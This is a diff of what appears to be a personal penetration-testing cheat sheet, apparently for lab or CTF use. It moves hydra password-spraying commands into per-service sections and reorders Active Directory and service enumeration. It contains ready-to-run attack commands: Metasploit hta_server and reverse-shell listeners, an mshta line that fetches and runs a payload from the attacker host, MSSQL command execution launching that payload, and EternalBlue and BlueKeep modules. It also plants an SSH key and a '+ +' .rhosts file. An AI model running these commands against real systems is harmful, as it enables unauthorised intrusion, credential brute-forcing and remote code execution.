@@ -43,15 +43,12 @@ cat usernames | sed -n 's/.*\\//p' | cut -d ' ' -f 1
 ## Hosts
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
-## Spraying
-hydra -L usernames -P passwords ftp://$TARGET -t35
-hydra -L usernames -P passwords ssh://$TARGET -t35
-hydra -L usernames -P passwords smb://$TARGET -t35
-hydra -L usernames -P passwords rdp://$TARGET -t35
-hydra -L usernames -P passwords snmp://$TARGET -t35
-hydra -L usernames -P passwords rlogin://$TARGET -t35
-hydra -L usernames -P passwords telnet://$TARGET -t35
-hydra -L usernames -P passwords vnc://$TARGET -t35
+## bloodhound
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
+impacket-GetADComputers retro.vl/ -dc-ip 10.10.117.117 -k -no-pass
+bloodhound-python -c all -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
+bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
 
 ## Web
 [*] Technology
@@ -89,83 +86,20 @@ ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
 wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
-## Infrastructure
-[*] (21) FTP
-nxc ftp "$TARGET" --port 21 -u '$USERNAME' -p '$PASSWORD' --ls
-ftp '$USERNAME'@"$TARGET"
-anonymous
-ls -a
-binary
-ascii
-get file.txt -
-
-[*] (23) Telnet
-telnet --user $USERNAME $TARGET
-
-[*] (79) Finger
-finger '$USERNAME'@$TARGET
-while read -r user; do finger "$user"@$TARGET; done < usernames
-
-[*] (161) SNMP
-sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
-onesixtyone $TARGET -c STRING_WORDLIST
-snmp-check $TARGET -c VALID_STRING
-snmpwalk -v1 -c public $TARGET | grep 'STRING:'
-
-[*] (389) LDAP
-(nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' &)
-
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName"
-
-ldapsearch -H ldap://"$TARGET" -x -s base namingcontexts
-ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)"
-ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=dn: ).*' | grep -oP '(^[^@]+)'
-ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=userPrincipalName: ).*' | grep -oP '(^[^@]+)'
-ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=description: ).*'
-ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "" -s base "(objectClass=*)" | grep -v 'supported'
-ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
-
-[*] (445) SMB
-(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-impacket-samrdump "$TARGET"
-
-[*] (2049) NFS
-showmount -e $TARGET
-for x in $(showmount -e "$TARGET" | awk '{print $1}' | grep -v 'Export')
-    do mkdir -p "/dev/shm"/mnt"$x"
-    sudo mount -t nfs "$TARGET":"$x" "/dev/shm"/mnt"$x" -o nolock
-    tree -puga "/dev/shm"/mnt"$x"
-done
-sudo adduser -u 1002 mntuser
-sudo usermod -u 1003 mntuser
-sudo su mntuser
-setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
-
-[*] (3306) MySQL
-mysql -h "$TARGET" -u root@localhost -e 'show databases;'
-
-[*] (3389) RDP
-msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $TARGET; run; exit"
-
-[*] bloodhound
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-impacket-GetADComputers retro.vl/ -dc-ip 10.10.117.117 -k -no-pass
-bloodhound-python -c all -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
-bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
-
 # Exploitation
-## MSHTA
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; run"
-mshta.exe http://$MYIP:8080/nZzLAD.hta
-sessions -i 1
-
 ## Listeners
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; run"
 rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 5555; run"
 rlwrap nc -lvnp 5555
+python3 -m http.server 8080
+
+## MSHTA Payload
+mshta http://$MYIP:8080/nZzLAD.hta
+sessions -i 1
+
+## Sorting Files
+sort -u usernames | tee usernames
+sort -u passwords | tee passwords
 
 ## Web
 [*] Reverse Shell
@@ -337,12 +271,34 @@ https://datafetcher.com/graphql-json-body-converter
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
 ## Infrastructure
+[*] (21) FTP
+hydra -L usernames -P passwords ftp://$TARGET -t35
+
+nxc ftp "$TARGET" --port 21 -u '$USERNAME' -p '$PASSWORD' --ls
+ftp '$USERNAME'@"$TARGET"
+anonymous
+ls -a
+binary
+ascii
+get file.txt -
+
 [*] (22) SSH
+hydra -L usernames -P passwords ssh://$TARGET -t35
+
 ssh-keygen -f sshkey -N ''; cat sshkey.pub
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
 ssh-add -D
 $USERNAME@$TARGET -i sshkey.pub
 nano id_rsa; chmod 600 id_rsa; $USERNAME@$TARGET -i id_rsa -o PubkeyAcceptedAlgorithms=ssh-rsa
+
+[*] (23) Telnet
+hydra -L usernames -P passwords telnet://$TARGET -t35
+
+telnet --user $USERNAME $TARGET
+
+[*] (79) Finger
+finger '$USERNAME'@$TARGET
+while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
@@ -382,7 +338,42 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
+[*] (161) SNMP
+hydra -L usernames -P passwords snmp://$TARGET -t35
+
+sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
+onesixtyone $TARGET -c STRING_WORDLIST
+snmp-check $TARGET -c VALID_STRING
+snmpwalk -v1 -c public $TARGET | grep 'STRING:'
+
+[*] (389) LDAP
+(nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' &)
+
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName"
+
+godap $TARGET -u '$USERNAME' -p '$PASSWORD'
+
+[*] (2049) NFS
+showmount -e $TARGET
+for x in $(showmount -e "$TARGET" | awk '{print $1}' | grep -v 'Export')
+    do mkdir -p "/dev/shm"/mnt"$x"
+    sudo mount -t nfs "$TARGET":"$x" "/dev/shm"/mnt"$x" -o nolock
+    tree -puga "/dev/shm"/mnt"$x"
+done
+sudo adduser -u 1002 mntuser
+sudo usermod -u 1003 mntuser
+sudo su mntuser
+setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
+
+
 [*] (445) SMB
+hydra -L usernames -P passwords smb://$TARGET -t35
+
+(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
+
 smbclient -L //$TARGET -U '$USERNAME'%'$PASSWORD' 2>/dev/null | awk '/-----/{f=1;next} f {print $1}' | awk '{print "use " $1 "\ntree\n\n"}' > smbcommands; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile smbcommands | grep -vE '[-]|# tree' | sed 's/^[ \t]*//' | tee smbfiles
 
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
@@ -396,6 +387,8 @@ download file.txt
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
+hydra -L usernames -P passwords rlogin://$TARGET -t35
+
 echo '+ +' > .rhosts; chmod 600 .rhosts
 rlogin $USERNAME@$TARGET
 
@@ -411,7 +404,14 @@ msfconsole -x -q "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; s
 msfconsole -x -q "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
 
+[*] (3306) MySQL
+mysql -h "$TARGET" -u root@localhost -e 'show databases;'
+
 [*] (3389) RDP
+hydra -L usernames -P passwords rdp://$TARGET -t35
+
+msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $TARGET; run; exit"
+
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Downloads/"
 
 xfreerdp /v:'$TARGET' /d:'$DOM' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Downloads/"
